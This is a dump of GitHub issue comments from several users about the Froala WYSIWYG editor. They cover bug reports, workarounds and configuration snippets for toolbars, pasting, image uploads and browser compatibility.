My bad - correctly specifying the \"scrollableContainer\"-option fixes this issue.\n. @kotmatpockuh I haven't actually tested this scenario, but it looks like you've found another issue with the editor.\n@stefanneculai This could possibly be solved by allowing us to specify both a \"scrollableContainer\" and a \"popupContainer\"?\n. This appears to be fixed by changing:\n$(editor.original_window).on('scroll.sticky' --> $(editor.opts.scrollableContainer).on('scroll.sticky'\n. The above is only a partial fix, it will not work correctly unless the scrollableContainer is rendered at the top of the window.\n. Gotcha - thanks for the reply :-)\n. Sure thing - from what I can tell the issue with the toolbar \"jumping\" when sticky turns on is related to padding on the scrollable parent.

That means I wont be able to help verify your fix, sorry for the inconvenience.. @stefanneculai Thank you for the quick reply :-)\nI've tested https://www.froala.com/wysiwyg-editor in Chrome incognito (where all my extensions are disabled).

I'm using danish keyboard layout. My colleague just pointed out that the same issue exists in gmail.com, so it's most likely an issue with our keyboard layouts.

I was able to add a more robust list of emojis via this list of alpha codes (https://github.com/Ranks/emoji-alpha-codes), but displaying all of them in a \"fr-popup\" as one LONG list doesn't really provide a useful/intuitive UI. It also requires a great deal of memory and network bandwidth to be downloading and displaying all of them as images at once.

As Diana said, every time you leave ajax loaded page you need to destroy initialised instance of Froala editor.

This is happening because you didn't manage to destroy Froala right before you leave initial page.\nI'm not sure about meteor way but jquery ajax events are explained here https://api.jquery.com/Ajax_Events/.\nYou would need \"before send\" event to destroy FE instance when navigating away.\n.

I think our users would really be struggling to get the toolbar to show to insert images and lists, but I don't think the toolbar should be visible continuously while typing.\n. I just found out that the behaviour I described in my issue depends on the tag used on the original Froala element.\nIn our application we use <data> tags to define editable content in the page. We chose this tag because it doesn't break the DOM structure when applied to lists, spans or paragraphs. So the element is defined as follows. Froala is then initialized on data-type=\"html\". This tag does not automatically add <p> tags.\nhtml\n<data data-type=\"html\"></data>\nWhen I use a <div> tag instead, it does add <p> tags. \nhtml\n<div data-type=\"html\"></div>\nDoes Froala automatically adjust its behaviour based on the original element in the DOM?\n. I think the behaviour is not completely correct. I would like to suggest two possibilities.\n1. A few tags that do support p tags, like article don't support the tags in the current configuration. I think a better option would be to reverse the behaviour and turn ENTER_BR on when the editor is initialized on a tag like h1, h2, p, etc. So default behaviour would be ENTER_P.\n2. I have also noticed that there is no way to override this behaviour. We would prefer to be able to set the enter option ourselves when needed.\n.

I tried to execute a JS function that toggles the Froala editor by adding a 'click' event listener to that DOM element. It seems that the event listener get's removed during editor initialization.\nBy \"have JS outside of the editor\", do you suggest that I should put the menu bar DOM element outside the DOM tree on which Froala is initialized?\n. Of course that JS code is in a <script> tag. Adding onclick to htmlAllowedAttrs did it. Thank you very much, @stefanneculai \n. Thank you!\n. I like this approach! Thanks, @stefanneculai \n. ",

    "ConnorsFan": "Is commands.selectAll supposed to work in IE11? According to my tests in Windows, it works with Firefox and Chrome, but not with IE11.. I found the problem. One of my CSS styles was setting 'user-select: none; -ms-user-select: none;' (and all other flavors of that attribute) on the rich text element and its descendants. That does not seem to affect the 'selectAll' command in Chrome and Firefox, but it prevents it from working in IE11 and Edge. My bad, sorry.. I hope that this feature will be implemented. The current behavior is somewhat confusing for our users.. I don't understand. I want to do some custom formatting that is not provided by Froala (e.g. change the line height in a paragraph), and allow the user to undo that change. How should I proceed? I thought that I could save a snapshot in the undo stack before doing the change, but the snapshot is not saved.\nYou say that the snapshot is saved only when different. Different from what? If I try to save a snapshot, it is not saved on the first try, but it is on the second try. That second snapshot is not different from the first one.. In my own applications, when I implement an undo feature, I must push the current state on the undo stack before making a change. If I understand what you are saying, I should call undo.saveStep after having modified the editor content. I will try that.. It works. Thanks!. Can you give me an example so that I can try it?. Thanks! It works well also in my Angular application.. ",

    "markedmondson": "@stefanneculai following up on:\n\nIt's not working because you're include the CSS from CDN. You should include it from a location which is not remote. The CSS should be on the same server where you're page is and include it via absolute/relative path. It's a browser limitation which does not allow to read CSS properties from remote CSS styles.\n\nWhich is not entirely true. If you give your CSS a CORS header allowing the requesting origin and add a crossorigin attribute to the CSS link this does work (at least in Chrome 64+).\nThe tricky part (at least in my case) was getting that Access-Control-Allow-Origin header on the asset as it's served as a static asset from Rails through Cloudfront. I'll document the process someplace in case anyone else comes across it or should care.... I'd love to see promises implemented on the afterPaste event too!. @pelizza https://github.com/froala/wysiwyg-editor/blob/master/js/plugins/word_paste.min.js. Calibri aside, the source shows that the span isn't correctly capturing the entire text block:\nhtml\n<p><span style=\"font-size:15px;font-family:Calibri;\">This gets incorrectly formatted as Times.</span> This is correctly Calibri</p>\nNote the position of the span.. Awesome @stefanneculai thanks!. @kristian-puccio It is kind of possible to do S3 pre-signing. Incomplete psuedo-code:\n```javascript\n// Return whether there's an existing valid policy\nfunction policyValid() {\n  return typeof editor.opts.policy_expires_at !== 'undefined' && editor.opts.policy_expires_at > new Date();\n}\nfunction getSignature(callback) {\n  $.ajax({\n    type: \"POST\",\n    url: editor.opts.asset_policy_path,\n    data: {\n      ...\n    }\n  }).done(function(data) {\n    editor.opts.policy_expires_at = new Date(new Date().getTime() + editor.opts.policy_expiry_time);\n    editor.opts.imageUploadToS3.keyStart = data.signature.key;\n    editor.opts.imageUploadToS3.params.policy = data.signature.policy;\n    editor.opts.imageUploadToS3.params.signature = data.signature.signature;\n    callback();\n  }).fail(function(jqXHR) {\n    editor.events.trigger('image.error', [\n      {\n        code: 0,\n        message: \"There was an error fetching the secure settings\"\n      },\n      null,\n      null\n    ]);\n  });\n}\neditor.events.on('image.beforeUpload', function (images) {\n  // If the policy is already valid, just allow the upload\n  var policy_valid = policyValid();\n  if (policy_valid) {\n    return true;\n  }\n  getSignature(function() {\n    // Manually trigger a fileupload now the settings are defined\n    editor.events.disableBlur();\n    editor.image.upload(images);\n    editor.events.enableBlur();\n  });\n  // Return false to stop the initial file upload\n  return false;\n});\n```\nIt's a kind of similar process for integrating Rails ActiveStorage where you have to hijack the image.beforeUpload and return false.

FWIW we're initializing the troublesome editor in React.. Thanks @stefanneculai, should we expected to see 2.7.5 soon or should we just pull those changes into 2.7.4 to get it working?. Additionally, pasting a URL seems to be broken entirely.. On second thoughts, I don't think this is relevant - I was coming at it in the wrong way. Sorry!. It looks like this might have been fixed in 2.7.4. Still testing, will come back and close if so.. Ah, I wasn't logged in. Thanks :). ",

    "hackel": "Please re-open this as a feature request.  It would be quite easy to implement.  For now, I'm relying on a completely separate drop target that allows for multiple attachments, but this is a far less cohesive experience for end-users.\n. I was thinking primarily about dropping multiple images on the drop target to appear in the image gallery, as opposed to directly in the editor itself, though I could see both being desirable, as well as the ability to select multiple images from the gallery to insert into the editor.  Inserting them one after the other at the cursor position makes the most sense to me, then they can be dragged around wherever needed.\nIn terms of a long upload time, I personally think that's fine.  A fancy progress bar would be nice, of course, but not strictly necessary.  Users can certainly be advised against long uploads, etc.\n. @sanjay-parmar-tatva What exactly did you change?  How did you address the above mentioned issues?  I'm fairly certain you are not allowed to distribute derivative works per the disgusting, closed-source license of this product.. @stefanneculai According to that link, \"I don't have to do anything,\" since I am running v2.3.4 and I have disabled toolbarSticky.

Pretty disappointing since I have paid for a license for this product and many of the free alternatives already offer this.. This is probably related to the issue I am having as well. If you paste a block with single line breaks, it adds p tags around every block of text. Is there an option to use br instead when pasting?. That doesnt solve my problem when you paste text from a text editor with soft line breaks it adds p tags around every line. Anyway to solve that?. Note: This happens with the Word Paste module enabled and when selecting either clean or keep options. Nevermind, I think this is fine behaviour. Once we mark the changes as accepted they do not appear.. That seems odd... so it only clears formatting on span? Is there another button to remove all font and colour inline styles?.

And I don't think you can consider the inline Froala toolbar itself as external CSS properties.\nStrangely enough, we do have toolbarInline set to false but it still shows up when clicking an image for example.\n. You have to understand that the problem is related to e.g. images getting extra styles like the cursor: pointer and z-index: 3 added to them.\nI'm pretty sure the extra cursor and z-index styles are related to your inline image properties editor and that they don't get properly cleaned up when switching to HTML view. I'm wondering whether that will get stored when saving the HTML and whether that will cause the images to have cursors and weird z-index when that HTML is displayed in a different context.\n. I'm sorry about that, I sort of stitched the two things together because I only noticed the fr-* classes and the style additions at the same time.\nI'll paste our editor config below, maybe it helps:\n$('#contents').froalaEditor({\n            // Set the language code.\n            height: 600,\n            toolbarInline: false,\n            iframe: true,\n            iframeStyle: 'html{margin: 0px;height: 100%;display:table; width:100%;}body{height:100%;padding:10px;background:transparent;color:#000000;position:relative;z-index: 2;-webkit-user-select:auto;margin:0px;display:table-cell; text-align:center; vertical-align:middle;max-width: 700px;}body:after{content:\"\";clear:both;display:block}',\n            useClasses: false,\n            codeMirrorOptions: {\n                mode: 'html',\n                theme: 'material',\n                lineNumbers: true,\n                tabMode: 'indent',\n                indentWithTabs: true,\n                lineWrapping: true,\n                tabSize: 2\n            }\n        });\nThis is used for editing the contents of an e-mail by the way (hence the IFRAME, we want it in an isolated environment), so that's why I'm really careful with any style attribute issues.\n. OK, thanks a lot; any idea when a new release will be out?\nRelated to the inline styles -- wouldn't it be easier to just inject Froala-specific classes when displaying the WYSIWYG editor and then remove them when displaying the HTML source?\nI'm not sure how the editor is coded, but this is what I'm thinking would be most feasible.\n.

My impression of a \"Sticky Toolbar\" would be that when I scroll down, the toolbar is always visible even if the editor becomes off page. Redactor does this so that if you have very large documents, when you scroll the Toolbar sticks to the top at all times and is visible regardless of the height of the editor.\nThe page I linked does not do this, it just acts like the normal editor, here is a screenshot where the toolbar is not visible:\n\nUnless I am miss understanding what this is?\n.

Unfortunately It doesn't accept a list of items or classes to exclude (as per your fr- suggestion above). It also doesn't apply this exclusion to children (see https://github.com/ftlabs/fastclick/issues/119). To work around, we need to go in and apply a needsclick class to the froala contenteditable element (div class=\"fr-element fr-view needsclick\") and all its nested children.\nTo do this, I'm doing this on Froala init, blur and destroy. On init for the start state and to cover any existing content, then on blur and destroy to cover any new/changed content after a user has finished editing:\n(...init settings etc)\n'_oninitialized':function (e,editor){\n    ....\n    $(e.target).find('[contenteditable], [contenteditable] *').addClass('needsclick');\n},\n'_onblur':function (e,editor){\n    ....\n    $(e.target).find('[contenteditable], [contenteditable] *').addClass('needsclick');\n},\n'_ondestroy':function (e,editor){\n    ....\n    $(e.target).find('[contenteditable], [contenteditable] *').addClass('needsclick');\n}\n...\nIs this the best way to go about it, or is there a way we can pass a custom class to Froala to add to all nested elements (eg as per the old fr-tag thing mentioned here: https://github.com/froala/wysiwyg-editor/issues/259)?.

I want to jump in late here and say that you also want to allow their attributes:\nhtmlAllowedAttrs should include \"xmlns\", \"viewbox\", \"d\". Have you been able to make custom elements draggable? I've tried and can drag them, but dropping them results in them being deleted.\nI also have my custom tag in \"htmlAllowedEmptyTags\" and \"htmlAllowedTags\".\nAlso, fyi,  you can make your code easier to read and edit by doing this (if you're just adding new tags to the arrays):\n```\nlet newHtmlAllowed = $.FE.DEFAULTS.htmlAllowedTags;\nnewHtmlAllowed.push(\"div p\", \"div div p\", \"custom-tag\");\nvar froalaDefaultOptions = {\n    htmlAllowedTags: newHtmlAllowed\n}\n$(\"#target\").froalaEditor(froalaDefaultOptions);\n```\nor, simply\n$.FE.DEFAULTS.htmlAllowedTags.push(\"div p\", \"div div p\", \"custom-tag\");. Ok, I've got it figured out.  I had put contenteditable=\"false\" in the element to prevent it from having anything inside of it.  This prevented it from being dropped.  I removed it and now it works.  I wonder how I'll prevent adding anything into my custom element.  Back to the drawing board.. I created a couple of plugins that add DIVs into the editor.  We need DIVs to be in the $.FroalaEditor.BLOCK_TAGS list so that they're allowed as top-level elements, but I also want people to be able to type comfortably within them, and add P tags by hitting enter, without them being split apart.\nIs there any way to accomplish this?. @stefanneculai thanks for that, that seems to allow me to add new lines.  However, they're coming out as BR tags instead of P tags.  Is there a way to allow P tags within div elements, specifically?. Ok, thanks, this will work for now.  Is there a list of special classes like fr-inner somewhere?. Ok.  I worked up a bit of code that uses the same format for registering an icon and event, but once it tries to create the button, it's missing the object necessary.  So, either the way icons themselves are created would have to be changed, or the Quick Insert icons needs to be rewritten to be identical to the other icons, and rely on registered commands, etc.\nAnyway, I hope my solution above helps anyone who is looking for an immediate solution and isn't afraid to get their hands dirty.. Test this in Firefox:  highlight the top text in this example, and the toolbar will go out of the iframe:\nhttps://jsfiddle.net/SeanKendle/88ex1L63/3/. JSFiddle isn't working.  They're appending an extra quote into the jQuery script tag suddenly.\nHowever, the example on the Froala website is enough to test it.  Just make the image in that example full width in the editor.\nhttps://www.froala.com/wysiwyg-editor. https://www.youtube.com/watch?v=dZKclK6hVf8. Is scrollableContainer not the window when editing inline?. Thanks!. I did that, but when you add a new image it comes with classes already predefined.. Thanks for you attention to this matter, @stefanneculai!  As always, your customer service/tech support is fantastic!. Now that I'm trying this in v2.7.5, it appears the editor is no longer respecting the \"missing buttons = no image classes\" rule:\nhttps://jsfiddle.net/gj8Lsnyg/6/. Here is the HTML that is output after I apply an alignment on caption text, then call \"html.get()\":\n<p><span class=\"fr-img-caption\" style=\"width: 300px; width: 300px; width: 300px;\"><span class=\"fr-img-wrap\"><img src=\"[IMAGE URL REMOVED]\"><span class=\"fr-inner\"></span></span></span></p><div style=\"text-align: left;\">Image caption</div>. No, v2.7.5 broke our implementation as described in another of my posts.. However, I did a diff with the aviary plugin and it's the same exact file.. We cannot update to v2.7.5 because it breaks our editor per: https://github.com/froala/wysiwyg-editor/issues/2562. How can I include the aviary plugin on that fiddle?. Thanks, I've updated it. Looks like I can't recreate it in this version. I'll definitely test once we upgrade to the next version once that's out. For now I think this is resolved, but I will comment with my findings after the next Froala update. Thanks again!. Test fiddle:\nhttps://jsfiddle.net/46ahu03g/. This had to do with how I was instantiating my own custom plugins, not an issue with Froala. I've fixed it on my end.. I've changed them to DIVs with contenteditable=\"false\" to make my example more clear. I want to be able to backspace within the P tag, and delete the P tag itself. Not the Divs.. To be able to add back in that line, I just add those tags to the Line Breaker tags array. It seems to work fine.. I tried using events.disableBlur before, but the 100ms timeout creates a race condition. I could set a timeout for 101ms, or something like that, but that feels hacky. I'll see if I can get the popup to open again. Thanks.. I know the \"joys\" of working with IE, and I didn't mean to suggest your workaround is hacky. Just that my own workaround for your workaround would be hacky... two timers.\nDo you think you could raise an event on \"enableBlurForIE\", or something, at that time that I could add a listener for?\nThanks. One last thing, and you may already know this, but in order to get that to work, the iframe's height and width have to be attributes rather than inline styles. Cheers!. Further information: I just tested on Edge, and you can't drag the elements in there either.. I can confirm this on Firefox on Windows 7 as well.. I think I've spotted the problem. It has entirely to do with my hover menu code and how it builds the menu on click. I was resetting the on click listener, and setting it from the document scope. By that time the editor was referencing the last editor initialized on the page. I believe I have fixed this by setting the on click listener at the time of the plugin init function, and with the scope of editor.$el instead of $(document).\nThanks for your attention, I hope I didn't waste too much of your time.. Experiencing this with DIV elements as well, even when they have the \"fr-inner\" class.. I've set up a user for you in our control panel. Email me  and I'll send you the credentials.. Can you explain how to use the image.get/.insert functions? Is there documentation available?. I just tried using the image.insert and it inserts it at the top of the editor. The problem is that the editor is being blurred and the selection is not saved. I've tried saving the selection, then disabling blur, then restoring the selection once the image is selected, and then inserting the image with that function, but it still inserts it at the top of the editor.\nIs there a reason the Link dialog doesn't close when selecting something from an iframe, while the image dialog does?. Also happens with DIVs. Similar to another already submitted bug request.. Also happens with DIVs. Similar to another already submitted bug request.. I know, but he added support for Font Awesome 5 in a recent update, and to fully flesh it out, support for fab should be added.. Before FA5 implementation, I created my own plugin that added support for it in the same way, so it's definitely helpful.. Looks like adding fr-inner class fixes this issue.. This is still a bug in v2.9.2. Nevermind I found it in my account, sorry!. ",

I did some more digging and found the issue if anybody has the same problem in the future. We have a custom theme that set transition: 0.2s on Froala's <inputs />. Removing this fixed the issue and the field autofocuses correctly now.. Following on from @arambert's comment above, if you're using webpack, it will use the AMD module definition in Froala instead of the CJS one as it's defined first and the code he provided won't work.\nAdding this to your webpack config will ignore the AMD loader for just this file:\n```\nmodule: {\n  rules: [\n    {\n      test: '/froala_editor\\.pkgd\\.min/',\n      parser: { amd: false }\n    }\n  ]\n}. I'm seeing this same issue and it's not related to the phone. It's because the orientation of the photo is stored in EXIF data and this data is not being honoured when Froala is presenting the image back. See this SO answer for more details http://stackoverflow.com/questions/20600800/js-client-side-exif-orientation-rotate-and-mirror-jpeg-images\nThis library has support for automatically rotating the images based on EXIF data: https://github.com/blueimp/JavaScript-Load-Image\nIf you didn't want to import the entire library you could use the logic from this file to roll your own solution https://github.com/blueimp/JavaScript-Load-Image/blob/master/js/load-image-orientation.js. @stefanneculai That would work but the preview you see while it's uploading would still be the wrong orientation.\nI can see the problem is that in the _startUpload method in image.js where you're using FileReader to grab the image and display it before upload. This approach doesn't read the EXIF data so the blob you have isn't orientated correctly. I am probably going to have to fix this in my company's version of Froala (we have paid for a full license so have access to the source) - how can I contribute these fixes back to you?. @steve-tapley In the end we did hack up the image plugin to add this behaviour as I described above (we also added support to resize the image down if its above certain dimensions). I wish it was in built-in by default.. @stefanneculai This is a blocker for us right now. Any idea how long before this lands in a release?.

I understand your point, having the option to cherry pick what you want is great! Don't get me wrong. And that's why I suggested you to keep all the plugins separately and only additionally add the packaged files for people who don't want to be bothered with having to remember the plugins name, having to type them all or having to create a GULP task to deal with the concatenation. \nThat will only make things easier while keeping the cherry pick functionality. \nI do believe that for testing purposes developers get tired of having to import 47 files or 30 or 20 or even 10! to just quickly test something in jsfiddle, codepen or in their own projects or even to just quickly start an app if they are not bothered with the time-load.\nProbably that's the reason why any popular library out there (as big as it might be...) provides packaged files. I got quite surprised to see 47 imports to \"get started\" with the library. (in fact, at first I though it was a joke....)\nIf Bootstrap had only provided 50 separated files I really doubt it would have become that popular. But instead, providing a customize feature that allows developers to cherry pick makes it ideal. Similar to your customize option, but allowing you to select the files. \nPersonally this puts me off from purchasing the library.

Here are IE 11 versions of team members who are able to reproduce:\n11.0.9600.18500, update versions 11.0.36 (Windows 8.1)\n11.633.10586.0, update versions 11.0.36 (Windows 10)\nAnd versions from team members who aren't able to reproduce:\n11.0.14393.0, update versions 11.0.33 (Windows 10)\n11.321.14393.0, update versions 11.0.36.

Thanks. Hi @stefanneculai just following up to see if you have reviewed this? Any chance we could reopen this. Thanks. Thankyou for clarification. That solves 1. \nHowever, I understand there is still a bug with 2, as demonstrated here:\n\nThe tab key does not work when the previous bullet is bold. \n. Would you consider making the behaviour consistent with Microsoft Word? \n\nThanks! \n. May I ask the likelihood this will be added? Thanks. I would consider that the behaviour is correct if it is dragged and dropped from within another or the same froala editor. But if it is dragged from outside the editor (eg. from a different tab) then adding the link is unstable. Would you agree? . I can speak for my users that this has been an issue. They drag images in from other sources (eg. Facebook) and the facebook links do not work for other people (privacy reasons). \nIf they are uploaded no matter where the image comes from, we are protected right? . Sorry to be persistent @stefanneculai but google docs is able to handle this over drag and drop. . Thanks @stefanneculai, I guess this isn't possible then \ud83d\ude15. Here is a sample PDF document: http://www.harrisonsim.com/chapters/CH27_final.pdf\nI am copying from Preview on MacOS. Interestingly, when copying from a PDF open in chrome, the paste result is very different. . The only issue with this, is showing the format of the selected text. \nI think there is great value in having features that are consistent with Microsoft word for user friendliness reasons. \nIs this feature something that is planned for Froala? . @stefanneculai, I am aware of this. \nShouldn't this be included in the global list of denied tags? . @stefanneculai have you had the chance to review above?

Could you please provide the master CDN so I can reproduce it in a JS fiddle ? . @stefanneculai this is still occurring in master (2.6.0). \nI have finally worked out what is causing this: \nThe code in question is below\njs\n  editors.on('froalaEditor.paste.beforeCleanup', function (e, editor, clipboard_html) {\n    html = clipboard_html\n    $html = $('<div />',{html:html});\n    $html.find('*').css('font-family', '')\n    return $html.html()\n  });\n.

I get the same result in Safari. \n~~I will try to recreate this on a jsfiddle using master.~~ Creating a jsfiddle using master seems incredibly difficult (due to the lack of CDN's). \nI have done some further investigation and this is only occuring when the enter key is set to create div (apologies for not picking this up earlier)\njs\nenter: $.FroalaEditor.ENTER_DIV. No worries @stefanneculai I will follow normal layout in future. \nI have simplified steps: \n\nCreate a Table\nPress enter key a few times\nNote the addition of unnecessary lines\n\n\n.

If needed the above can be reproduced in this codepen: http://codepen.io/jeremylynch/pen/EmazVW?editors=0110. @stefanneculai if all children are selected, couldn't we just apply the inline styling directly onto the ul element? .

We're looking at doing that with Froala now.. @philfreo Awesome. Thanks for the fast response!. This issue with local network links seems pertinent: https://github.com/froala/wysiwyg-editor/issues/1989. I tried to make a small modification to plugins/link.js to add support for this.\nI replaced line 603 with the following:\n```javascript\n      /*\n      * Make sure network paths are not autoprefixed\n      *\n      * This regex matches G:\\file\\path.txt and \\network\\file\\path\n      ****/\n      var network_path_regex = /^(\\(\\[^\\s\\]+)+|([A-Za-z]:(\\)?|[A-z]:(\\[^\\s\\]+)+))(\\)?$/;\n  // Add autoprefix.\n  if (editor.opts.linkAutoPrefix !== '' && !/^(mailto|tel|sms|notes|data):.*/i.test(href) && !/^data:image.*/i.test(href) && !/^(https?:|ftps?:|file:|)\\/\\//i.test(href) && !network_path_regex.test(href)) {\n\n```\nThis allowed it through, but then the sanitizer messed it up.\nSo I added:\njavascript\n      // Sanitize the URL unless it's a network path\n      if (!network_path_regex.test(href)) {\n        href = editor.helpers.sanitizeURL(href);\n      }\nBut that seems insecure. I'm going to stop here and let the professionals look at it. \ud83d\ude04 . I believe that was my mistake. I didn't account for spaces in the RegExp accompanied with my issue report.. This has come up for us as well. We've gotten a lot of customers contacting us because the error message \"Something went wrong\" doesn't give them any way to resolve their own issue. \nFinding a string in an existing modal and replacing it on the fly seems very hacky. I echo jpgilchrist's sentiments that if you have the error messages already in a hash, we're better off showing them.\nAny one of these error messages would be fine to show a user compared to \"Something went wrong\":\n\nIn our case, we're just editing the plugin file to place the \"Something went wrong\" text with error_messages[code]. \nThis means we have to make sure to always remember to replace it when we upgrade to the new versions, but it's working..

Currently, if you're in the code view then the contentChanged event isn't fired until you toggle back to the WYSIWYG view. I have tabs for the WYSIWYG view and code views and I'm storing the html from the editor when contentChanged is fired. I don't see why or how I would require the user to toggle back to the WYSIWYG view in order for the content to change after they've been making edits in the code view.\nHow would you recommend figuring out when the user has made edits in the code view? None of the events for the editor seem to fire so any changes made in the code view are lost.

Not to be pushy, just for our planning purposes would you possibly know how big of an endeavor this would be? Would you have an ETA? . @stefanneculai do we have an updated ETA on this issue? It is getting kinda pressing for us since we cannot update to the latest version of Froala. . @stefanneculai can I expect this issue to be resolved or should I look for a workarounds? . hi @dianaprajescu, thanks for the reply and happy new year! \nahh, issue #2081. That was unfortunately something that our customers were complaining about. and were seeing quite frequently. Perhaps we can get a hacky workaround for when Froala wrap the selection in a DOM element, to unwrap it first. I'm not a fan of this too much though because of the hackiness. \nWithout ripping out the fix for #2081, do you see a workaround that we can even do going forward? Since I made the issue, we transitioned our sliders to an input field with up and down arrows, so less wrapping should occur as a result of this issue. Bu still our text HTML can get pretty long if customers use the up/down arrows since Froala wraps the DOM elements. . hi @stefanneculai i understand. . ",

I only provided the Fiddle as an easy way for those who could reproduce the issue before to test it is now fixed. As far as I know that should be the case now. . @stefanneculai unfortunately this fix never had any effect.\nI've just booted up Windows myself and can confirm that (in Chrome, at least) Alt+D does delete any selected contents in the editor, rather than simply blurring the editor and selecting the address bar contents. This is reproducible on the Froala homepage too.. @stefanneculai @dianaprajescu \nSorry for the bump, but didn't want this to get missed.. @stefanneculai  yes, this video should demonstrate that. Worth noting that I've tried to demonstrate poor typing performance in general, but as this is a screen recording, that doesn't quite come across very well (obviously). All I can say about that is that the majority of the taps on the keyboard you see in the video actually occurred well after I actually tapped the screen.\nThe deleting issue is apparent, though. You'll notice that the editor is very unresponsive, especially after the backspace key is held down for a while.\nhttps://youtu.be/b4td2463l94\n. Might be a combination of hardware and software - the video I took was on the iPad Mini with iOS 9. I'll happily test - are those backspace changes committed to master yet?. The backspace issue seems a lot better and perhaps even typing in general. We'll call that fixed \ud83d\udc4d . @stefanneculai not a total priority for us as we don't officially support iOS versions beyond iOS 10, though we do tend to have some graceful degradation for older versions. For now, we've just stopped the editor loading for iOS 7 and below (was previously 6 and below), and a plain textarea loads instead.\nGiven the difficulty of testing and supporting such an old version (nearly 5 years!) I'm not sure you'd be blamed for dropping support for it inline with what you can reasonably still test based on what Apple supports.. Perfectly reasonable and fine by us. Good move. . @stefanneculai when the browser support page was updated, I think you increased the Android minimum requirements to Android 6.\nWe've recently had issues reported with Android 4.x but Android 5.x seems to work fine. Worth noting that Android 5, I believe, was the first Android version to (mostly) ship with Chrome as its default browser. Which, if kept up to date, should obviously work fine regardless of Android version. It's also the version that ships with Amazon Fire tablet (or at least did) and the default browser on that is Silk (which is based on Chrome).. Fair enough.\nWe've gone for blocking Froala on Android if the version is less than 5, but also only if they're not using a modern browser like Chrome or Firefox.. @stefanneculai I can reproduce what is mentioned in the last couple of comments. I can't quite reproduce what @belazor is reporting, though I'll keep trying, but I suspect the behaviour that I can reproduce should be similar.\nI've made a video:\nhttps://youtu.be/XOwH4xZ-Zkw\nI've slowed the video down to 2x speed. You do have to be very fast to repro it, hence slowing it down so you can more clearly see the exact steps.\nI recorded it in BrowserStack, and I've enabled KeyCastr so you can see the exact keys being pressed.\nYou'll see me type some normal text, then I hit Cmd + B, I, U type a word and then I hit Cmd + B, I, U again. You can see the toolbar buttons deactivate. I then hit space, the space key doesn't register either, which is weird. But when I start typing again, B I U are highlighted again.\nWould you like me to create a new issue for this, or will you re-open the issue?. Pretty much anywhere but I asked the user to try with Snipping Tool as I\u2019m most familiar with that (and know it works in Windows 10 and Froala) and pasting from a snip copied to the clipboard in Windows 8.1 did not trigger an upload. . I think there are issues in macOS too, actually. I suspect they must be related:\nhttps://youtu.be/IM38rfRalkk\nNotice that my intention here is to highlight the word \"current\" but I also highlight the preceding space.  I'm using Shift + Left Arrow to highlight the word. In normal usage (and in the previous version), Shift + Right would unhighlight the character you just highlighted, but in this case it starts adding highlighted characters on the opposite side.\n@stefanneculai unfortunately this regression is quite significant and it may prevent us rolling out Froala 2.8.0 in its current form. A fairly quick solution would be appreciated.... Just throwing this out there, on the off-chance you're not aware, but you can define and use your own icon template.\n```javascript\n$.FE.DefineIconTemplate('font_awesome_5b', '');\n$.FE.DefineIcon('css', { FA5NAME: 'css3-alt', template: 'font_awesome_5b' });\n```. Absolutely agree.\nHopefully people can use the workaround in the meantime.. If there's any known workarounds for this, that can be applied to the scrollable element, that'd be appreciated.. This looks similar to #3047 and #2621.\n2621 was closed but we found other reproduction cases that are similar to this so I opened #3047.. Windows 10, Chrome 68.\nRemember to reproduce it as in the video above you have to be quick. The video is slowed down to half speed.\nThing is, although I'm deliberately being almost too quick in the video, this does seem to be cropping up in normal usage so there may be other factors involved but there are at least now three different examples in the original issue #2621.. Worth noting that Cmd/Ctrl+K also doesn't focus the URL input like it does if you trigger the popup with a click.. Indeed. The issues you mention along with some other significant ones for us were introduced in v2.9.0. Unfortunately that version only brought us more problems than it solved and fixes haven't been as quick as they were in the past so we reverted back to using v2.8.5 in case that's any help. We'll stick with that until we see an improvement.. 2.8.5 isn't perfect by any means and it depends on your exact use case (some new features were added in 2.9 so you will have to check you're not using them).\nBut for our use case, 2.9.0 actually only fixed one outstanding issue we had and we had to re-open that as there ended up being more to it. It introduced a few more issues though.\nFrom our point of view, the following bugs still exist in 2.8.5 but they don't pose a major problem for us:\nhttps://github.com/froala/wysiwyg-editor/issues/3242\nhttps://github.com/froala/wysiwyg-editor/issues/3228\nhttps://github.com/froala/wysiwyg-editor/issues/3197. @stefanneculai I'm not actually seeing this fixed in Froala 2.9.3.\nThe test case was rather clear, the console output result HTML is missing the space between the closing tag of the strong tag and the img tag, and that still appears to be the case:\n. Thanks @stefanneculai \nThe workaround would be problematic if the editor isn't empty to start with as if there is existing content then the emoji would always be inserted at the start.\nWe discovered that the issue was exclusive to Froala 2.9.x so we have made the decision to roll back to Froala 2.8.x which had significantly fewer issues for us.. @stefanneculai while I can confirm that Firefox is no longer inserting a leading line break, the other part of the issue is not fixed.\n\ncursor getting stuck\nMultiple spaces should be inserted.\nThe cursor appears to get stuck.\nBut, more significantly, if you click into the editor next to the emoji image and start pressing space continuously, only a single space is inserted and the cursor appears to be stuck.\n\nhttps://www.youtube.com/watch?v=XbyeTuuKeZQ&feature=youtu.be\n.

Just looking through some of the eventing ATM. IMO the original functionality is \"correct\". I think if someone binds an event listener outside of the editor instance then it should be up to them to remove the event listener. Ex:\njs\nvar contentChangedHandler = function(){};\nvar $editor = $('.editor');\n$editor.froalaEditor();\n$editor.on('froalaEditor.contentChanged', contentChangedHandler);\n$editor.froalaEditor('destroy');\n$editor.off('froalaEditor.contentChanged', contentChangedHandler);\nBut if the event handler is applied via the editors method then they should be removed by the editor instance when destroyed. Ex:\njs\nvar contentChangedHandler = function(){};\nvar $editor = $('.editor');\n$editor.froalaEditor();\n$editor.froalaEditor('on.event', 'contentChanged', contentChangedHandler);\n$editor.froalaEditor('destroy'); // listener removed \"automatically\"\nFWIW, this is a breaking change for the ember-froala-editor addon, since event listeners are applied once when the element is inserted. \n. Because the addon attaches the listeners once, on render, but the editor may be destroyed and re-initialized within the life of the rendered element. It's a technicality that I'll need to work around.\n. Another reason why that approach is flawed. \ud83d\ude12 \n. Sure, but if you didn't removed event listeners that dev's added on their own, the last thing that the editor could do is trigger froalaEditor.destroyed.\n\nThe editor should unbind on destroy all the events that are attached to it.\n\nThis is the main disagreement, which I tried to explain in the other issue. In short (for event listeners), if the developer added it then the developer should remove it, but if the editor added it then the editor should remove it. This is a philosophical difference that I don't think we'll agree on. \u00af_ (\u30c4) _/\u00af\n. Oh, I see. The keydownEvent is the third arg. IMO this should be noted on the events.on method doc, that the first two args noted in the event docs (event and editor) are not passed to the callback using this method.\n. In regards to access to the un-minified source, I wonder if you could do something like Font Awesome 5, where they must use GitHub API's to add paying customers to their private repo. That way users of froala-editor can help debug the problem and submit PR's. Just an idea.. @stefanneculai Humm... since I'm using the <div contenteditable> version, if I change the inner 